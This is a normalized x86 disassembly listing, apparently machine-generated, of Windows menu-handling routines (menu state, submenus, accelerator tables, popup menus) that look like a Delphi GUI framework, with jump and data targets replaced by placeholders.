test di 0x40
je r-xdata
mov [ ebx ] 0x24
add ebx 0x2
mov [ ebx ] 0x0
test di 0x1
je r-xdata
mov [ ebx ] 0x40
add ebx 0x2
mov [ ebx ] 0x0
mov [ ebx ] 0x3b
add ebx 0x2
mov [ ebx ] 0x0
inc esi
mov [ ebx ] 0x23
add ebx 0x2
mov [ ebx ] 0x0
sub_4610b0
push ebp
mov ebp esp
add esp 0xfffffbfc
push ebx
mov [ ebp - 0x404 ] eax
xor ebx ebx
mov [ ebp - 0x400 ] 0x0
mov eax [ ebp - 0x404 ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ ebp - 0x404 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x404 ]
mov edx [ eax ]
call [ edx + 0x38 ]
call sub_460fe0
pop ecx
mov bl 0x1
mov eax [ ebp - 0x404 ]
add eax 0x58
lea edx [ ebp - 0x400 ]
mov ecx 0x200
call sub_407290
mov eax [ ebp - 0x404 ]
mov eax [ eax + 0x58 ]
call sub_407134
lea edx [ ebp - 0x400 ]
call sub_4126b4
test eax eax
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_461144
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x34 ]
mov [ ebp - 0x5 ] al
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x41 ]
mov [ ebp - 0x6 ] dl
xor edx edx
push ebp
push sub_4611b8
push [ fs : edx ]
mov [ fs : edx ] esp
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_461660
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_461660
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
movzx edx [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_461660
mov eax [ ebp - 0x4 ]
movzx edx [ ebp - 0x6 ]
mov [ eax + 0x41 ] dl
retn
sub_4611c4
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x3c ] esi
mov eax ebx
call sub_4610b0
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
cmp [ ebx + 0x41 ] 0x0
je r-xdata
mov eax ebx
call sub_461144
mov eax ebx
call sub_461684
jmp r-xdata
sub_46122c
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
movzx eax [ r-xdata ]
and ax [ ebx + 0x1c ]
movzx edx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
movzx ecx [ ebp + 0x8 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x34 ]
sub_461274
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x48 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x48 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x44 ]
call sub_48a414
mov eax ebx
call sub_460798
pop esi
pop ebx
retn
mov edx [ ebx + 0x44 ]
call sub_48a458
mov edx ebx
mov eax [ ebx + 0x48 ]
call sub_43c22c
sub_4612b0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_43c52c
cmp esi [ edi + 0x48 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor edx edx
mov eax edi
call sub_461274
sub_4612f4
push ebp
mov ebp esp
push esi
xor esi esi
test dl 0x10
je r-xdata
push ecx
push eax
call GetMenuItemID
cmp eax 0xffffffff
je r-xdata
push ecx
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_46084c
mov esi eax
jmp r-xdata
test esi esi
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
xor ecx ecx
xchg edx eax
call sub_46084c
mov esi eax
xor eax eax
movzx eax [ ebp + 0x8 ]
mov edx [ esi + 0x34 ]
call sub_4945f0
jmp r-xdata
pop esi
pop ebp
retn 0x4
sub_461350
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov [ ebp - 0x2 ] dx
xor edx edx
push ebp
push sub_461427
push [ fs : edx ]
mov [ fs : edx ] esp
test [ ebp - 0x2 ] 0x10
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_46084c
mov ebx eax
test ebx ebx
je r-xdata
push esi
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_46084c
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_45efdc
cmp esi eax
jge r-xdata
xor ebx ebx
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_45efec
mov ebx eax
lea eax [ ebp - 0x8 ]
movzx edx [ ebp + 0x8 ]
call sub_407214
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0x34 ]
movzx edx [ edx ]
call sub_407214
mov eax [ ebp - 0xc ]
pop edx
call sub_411254
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x34 ]
call sub_4624a8
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46142e
lea eax [ ebp - 0x10 ]
mov edx 0x3
call j_sub_4068c4
retn
sub_461438
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebp - 0xc ] 0xffffffff
mov [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x14 ] 0xffffffff
mov eax [ ebx + 0x8 ]
push eax
call GetMenuItemCount
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebp - 0xc ] 0xffffffff
jge r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
mov eax [ ebx + 0xc ]
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
movzx eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_4612f4
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp eax 0x3
jne r-xdata
shl eax 0x10
or eax [ ebp - 0xc ]
mov [ ebx + 0xc ] eax
jmp r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
mov [ ebp - 0xc ] 0xfffffffe
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jge r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
shl eax 0x10
or eax [ ebp - 0x14 ]
mov [ ebx + 0xc ] eax
mov edx [ ebp - 0xc ]
mov [ ebp - 0x14 ] edx
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
movzx eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_461350
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
mov [ ebp - 0x14 ] esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
mov [ ebp - 0x14 ] esi
sub_4615b4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_4609d0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push edi
call GetMenuStringW
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
push esi
push edi
call GetMenuState
test al 0x10
je r-xdata
push esi
push edi
call GetMenuItemID
mov esi eax
cmp esi 0xffffffff
je r-xdata
push esi
push edi
call GetSubMenu
mov edi eax
mov cl 0x1
mov edx edi
mov eax ebx
call sub_46084c
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor ecx ecx
mov edx esi
mov eax ebx
call sub_46084c
mov [ ebp - 0x4 ] eax
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_412694
mov eax [ ebp + 0x10 ]
call sub_412550
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_461684
push ebx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x3c ]
call sub_46d414
test eax eax
je r-xdata
movzx edx [ eax + 0x61 ]
mov eax ebx
call sub_461660
mov [ ebx + 0x41 ] 0x1
sub_4616ac
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_405830
movzx edx [ eax + 0x61 ]
mov eax ebx
call sub_461660
mov [ ebx + 0x41 ] 0x1
sub_461740
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
cmp [ edi + 0x3c ] 0x0
je r-xdata
movzx eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_46122c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax edi
call sub_4610b0
mov ebx eax
test esi esi
jne r-xdata
test bl bl
je r-xdata
push 0x0
push 0x0
push 0xb015
mov eax [ edi + 0x3c ]
push eax
call __imp_SendMessageW
mov eax [ edi + 0x3c ]
push eax
call DrawMenuBar
sub_4617d4
push ebx
push esi
mov ebx eax
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x3c ]
mov eax [ ebx + 0x3c ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb015
push eax
call __imp_SendMessageW
sub_461810
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi eax
movzx edx [ esi + 0x60 ]
test dx dx
je r-xdata
mov eax esi
call sub_45efdc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc ebx
xor edi edi
mov eax [ ebp + 0x8 ]
inc [ eax - 0x8 ]
jmp r-xdata
mov al 0x3
test dh 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax esi
call sub_45efec
call sub_461810
pop ecx
inc edi
dec ebx
jne r-xdata
test dh 0x80
je r-xdata
or al 0x8
test dh 0x20
je r-xdata
or al 0x10
movzx eax al
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx ] ax
movzx eax [ esi + 0x60 ]
and ax 0xff
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x2 ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
movzx edx [ esi + 0x50 ]
mov [ eax + 0x4 ] dx
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x6
jmp r-xdata
or al 0x4
sub_4618ac
push ebp
mov ebp esp
push ebx
push esi
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x8 ]
test ecx ecx
jl r-xdata
xor eax eax
pop esi
pop ebx
pop ebp
retn
inc ecx
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0xc ]
add edx 0x4
dec ecx
jne r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_461810
pop ecx
jmp r-xdata
movzx ebx [ eax + 0x3f ]
cmp ebx [ edx ]
jne r-xdata
sub_4618e4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x38 ]
mov edx [ eax + 0x68 ]
mov ecx sub_4618ac
xchg ecx eax
call sub_45b69c
mov eax [ ebp - 0x10 ]
xor edx edx
mov [ eax ] edx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ eax ] edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x8 ]
add eax eax
lea eax [ eax + eax * 2 ]
call sub_404204
mov esi eax
mov [ ebp - 0x4 ] esi
mov eax [ ebx + 0x38 ]
mov edx [ eax + 0x68 ]
mov ecx sub_4618ac
xchg ecx eax
call sub_45b69c
mov eax [ ebp - 0x8 ]
push eax
push esi
call CreateAcceleratorTableW
mov edx [ ebp - 0x10 ]
mov [ edx ] eax
mov eax esi
call sub_404220
sub_461968
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x4 ]
test esi esi
jl r-xdata
xor eax eax
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x8 ]
add ebx 0x4
dec esi
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0xc ]
inc [ edx + eax * 4 ]
mov eax [ ebp + 0x8 ]
movzx ecx [ eax - 0xd ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax edi
call sub_45bcf8
movzx eax [ edi + 0x3f ]
cmp eax [ ebx ]
jne r-xdata
sub_4619b4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] edx
mov ebx eax
mov eax ebx
call sub_4612dc
mov [ ebp - 0xd ] al
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x8 ]
test edx edx
jl r-xdata
mov eax [ ebx + 0x38 ]
mov ecx eax
mov edx [ eax + 0x68 ]
mov eax sub_461968
call sub_45b69c
pop ebx
mov esp ebp
pop ebp
retn 0xc
inc edx
mov eax [ ebp + 0xc ]
xor ecx ecx
mov [ eax ] ecx
add eax 0x4
dec edx
jne r-xdata
sub_461a10
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_461a3a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_461a5c
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x38 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_461fae
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi ]
cmp eax 0x111
jg r-xdata
sub eax 0x117
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x2b
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call DefWindowProcW
mov [ esi + 0xc ] eax
inc ebx
xor edi edi
mov [ ebp - 0xd ] 0x0
test [ esi + 0x6 ] 0x10
je r-xdata
dec eax
je r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
dec eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461fb5
lea eax [ ebp - 0x38 ]
call j_sub_4068a0
retn
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x27
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4305a0
mov edx [ esi + 0x4 ]
call sub_460908
test al al
jne r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_4a14ac
jmp r-xdata
inc ebx
xor edi edi
inc ebx
xor edi edi
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4305a0
movzx edx [ esi + 0x4 ]
call sub_4608ec
test al al
jne r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_44d060
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_461dc3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_461da6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x2c ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_44dfac
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x84 ]
mov eax [ ebp - 0x14 ]
call sub_44de18
mov eax [ ebp - 0x2c ]
movzx eax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x2c ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_4622a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461dad
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_44dfac
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
movzx eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov edx esi
mov eax [ ebp - 0x34 ]
call sub_461438
jmp r-xdata
mov edx [ esi + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0x34 ]
call sub_46084c
test eax eax
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4305a0
mov edx [ ebp - 0x2c ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_46084c
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call GetWindowDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_461f24
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_44d060
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_461eff
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x1c ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_461ee2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
call sub_44dfac
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x84 ]
mov eax [ ebp - 0x14 ]
call sub_44de18
mov eax [ ebp - 0x30 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x30 ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x24 ]
push eax
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov eax [ ebp - 0x30 ]
mov edx [ ebp - 0x20 ]
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x30 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x10 ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461ee9
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_44dfac
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x58 ]
call sub_46d7ec
mov edx [ ebp - 0x38 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4a14ac
jmp r-xdata
mov [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
movzx edx [ esi + 0x4 ]
push edx
push eax
call GetSubMenu
mov [ ebp - 0x8 ] eax
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4305a0
mov edx [ ebp - 0x30 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_46084c
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4305a0
mov edx [ ebp - 0x28 ]
mov edx [ edx + 0xc ]
mov cl 0x1
call sub_46084c
mov [ ebp - 0xc ] eax
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4305a0
mov eax [ eax + 0x38 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0xd ] 0x1
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4305a0
movzx ecx [ ebp - 0xd ]
mov edx [ ebp - 0x8 ]
call sub_46084c
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4305a0
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x34 ]
mov edx [ eax ]
call [ edx + 0x38 ]
cmp eax [ esi + 0x8 ]
je r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4305a0
mov edx [ ebp - 0x28 ]
mov edx [ edx + 0x8 ]
mov cl 0x1
call sub_46087c
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4305a0
mov edx [ eax ]
call [ edx + 0x38 ]
mov edx [ ebp - 0x28 ]
cmp eax [ edx + 0xc ]
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov edx [ edx + 0x68 ]
test edx edx
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4305a0
mov edx [ ebp - 0x28 ]
mov edx [ edx + 0xc ]
xor ecx ecx
call sub_46087c
test eax eax
jne r-xdata
mov ecx [ rw-data ]
test [ edx + 0x298 ] 0x8
je r-xdata
mov eax [ rw-data ]
mov eax [ edx + 0x168 ]
mov edx [ rw-data ]
mov edx [ edx ]
xchg edx eax
call sub_4a0f40
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov ecx eax
mov eax 0x8
xchg edx eax
call sub_4a0fc8
jmp r-xdata
sub_461f06
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call ReleaseDC
retn
sub_461fbc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_4303e0
pop esi
pop ebx
retn
push ebx
push sub_461a10
call sub_43df58
mov [ ebx + 0x10 ] eax
sub_462000
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_460674
mov [ esi + 0x60 ] 0xffffffff
mov [ esi + 0x64 ] 0xffffffff
mov eax [ esi + 0x38 ]
mov [ eax + 0x8c ] esi
mov edx [ esi ]
mov edx [ edx + 0x40 ]
mov [ eax + 0x88 ] edx
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x170 ]
mov [ esi + 0x3c ] eax
mov [ esi + 0x69 ] 0x1
mov edx esi
mov eax [ rw-data ]
call sub_461fbc
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax esi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_462078
push ebx
push esi
call sub_405bb4
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_461fe4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_460720
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_405b5c
sub_4620d0
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0x41 ] 0x0
je r-xdata
lea eax [ ebx + 0x60 ]
call sub_45b10c
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
movzx edx [ eax + 0x35 ]
mov eax ebx
call sub_461660
mov [ ebx + 0x41 ] 0x1
movzx edx [ eax + 0x61 ]
mov eax ebx
call sub_461660
mov [ ebx + 0x41 ] 0x1
jmp r-xdata
sub_46211c
push esi
xor edx edx
mov ecx [ rw-data ]
cmp [ ecx + 0xd ] 0x0
je r-xdata
mov eax edx
pop esi
retn
cmp [ eax + 0x41 ] 0x0
je r-xdata
cmp [ eax + 0x34 ] 0x1
sete dl
add eax 0x60
call sub_45b10c
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_49f398
mov edx eax
jmp r-xdata
mov si 0xffc7
call sub_40587c
mov edx eax
jmp r-xdata
sub_462168
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov [ esp ] esi
mov [ esp + 0x4 ] edi
mov edx esp
mov eax ebx
call sub_462214
mov eax ebx
call sub_4620d0
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor edx edx
mov eax [ ebx + 0x38 ]
call sub_45fc78
xor edx edx
mov eax [ ebx + 0x38 ]
call sub_460498
mov eax [ ebx + 0x38 ]
call sub_45c150
mov eax ebx
call sub_461144
mov eax ebx
call sub_46211c
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 2 + rw-data ]
movzx edx [ ebx + 0x68 ]
movzx ebp [ eax + edx * 2 ]
movzx eax [ ebx + 0x70 ]
or bp [ eax * 2 + rw-data ]
movzx ebp bp
movzx eax [ ebx + 0x71 ]
shl eax 0xa
or ebp eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
push eax
push 0x0
push edi
push esi
push ebp
mov eax [ ebx + 0x38 ]
call sub_45c284
push eax
call TrackPopupMenu
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_462214
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edx [ esp ]
mov [ eax + 0x60 ] edx
mov edx [ esp + 0x4 ]
